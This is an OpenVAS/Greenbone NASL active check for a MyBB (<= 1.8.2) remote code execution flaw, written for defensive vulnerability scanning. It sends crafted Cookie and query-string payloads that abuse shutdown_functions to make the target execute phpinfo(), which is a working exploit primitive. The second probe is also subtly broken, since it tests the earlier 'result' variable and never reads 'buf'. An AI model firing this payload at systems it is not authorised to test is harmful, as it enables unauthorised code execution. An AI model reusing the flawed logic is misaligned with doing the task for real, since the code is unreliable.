# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:mybb:mybb";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105122");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("2025-04-30T05:39:51+0000");
  script_tag(name:"last_modification", value:"2025-04-30 05:39:51 +0000 (Wed, 30 Apr 2025)");
  script_tag(name:"creation_date", value:"2014-11-24 11:50:21 +0100 (Mon, 24 Nov 2014)");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("MyBB <= 1.8.2 RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("sw_mybb_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("mybb/http/detected");

  script_tag(name:"summary", value:"MyBB is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a large special crafted HTTP GET request and check the
  response.");

  script_tag(name:"insight", value:"MyBB's unset_globals() function can be bypassed under special
  conditions and it is possible to allows remote code execution.");

  script_tag(name:"impact", value:"Successfully exploiting this issue will allow attackers to
  execute arbitrary code within the context of the affected application.");

  script_tag(name:"affected", value:"MyBB versions through 1.8.2.");

  script_tag(name:"solution", value:"Updates are available.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/35323/");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location(cpe:CPE, port:port ) )
  exit( 0 );

useragent = http_get_user_agent();
host = http_host_name( port:port );

req = "GET " + dir + '/ HTTP/1.1\r\n' +
      "User-Agent: " + useragent + '\r\n' +
      "Host: " + host + '\r\n' +
      'Cookie: GLOBALS=1; shutdown_functions[0][function]=phpinfo; shutdown_functions[0][arguments][]=-1\r\n' +
      '\r\n';
result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( "<title>phpinfo()</title>" >< result ) {
  security_message( port:port );
  exit( 0 );
}

if( dir == "/" )
  dir = "";

url = dir + '/index.php?shutdown_functions[0][function]=phpinfo&shutdown_functions[0][arguments][]=-1';
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( "<title>phpinfo()</title>" >< result ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
